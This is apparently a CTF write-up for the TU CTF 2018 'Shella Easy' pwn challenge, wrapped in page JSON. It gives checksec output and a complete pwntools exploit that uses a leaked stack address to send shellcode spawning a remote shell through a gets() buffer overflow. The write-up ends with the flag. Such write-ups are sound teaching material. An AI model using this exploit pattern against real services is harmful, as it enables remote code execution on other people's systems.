{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Shella Easy</h1>\n<p>We are given a <a href=\"/shella-easy-e22bd66817bad2d56690bd678a395899.\">binary</a> without any exploit mitigations.</p>\n<p><code>bash vagrant@amy:~/share/shella_easy$ file shella-easy shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped</code></p>\n<p><code>bash gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial</code></p>\n<p>The program has a call to <code>gets</code> and thus is a vanilla stack based buffer overflow. Exploitation allows us to get the flag from the server.</p>\n<p>`<code></code>python\nfrom pwn import *</p>\n<p>context(arch='i386', os='linux')</p>\n<h1>p = process('./shella')</h1>\n<p>p = remote('52.15.182.55', 12345)</p>\n<p>p.recvuntil(\"Yeah I'll have a \")\nleak = p.recvuntil(' ').strip()\nleak = int(leak, 16)</p>\n<p>shellcode = asm(shellcraft.i386.sh())\nshellcode = shellcode.ljust(64, '\\x90')\nshellcode += p32(0xdeadbeef)\nshellcode += 'a' * 8\nshellcode += p32(leak)\np.send(shellcode)\np.interactive()\n`<code></code></p>\n<p>Flag</p>\n<blockquote>\n<p>TUCTF{1<em>607</em>4<em>fl46</em>bu7<em>n0</em>fr135}</p>\n</blockquote>","relativePath":"writeups/tu-ctf-2018/pwn/shella-easy/jaiverma"}}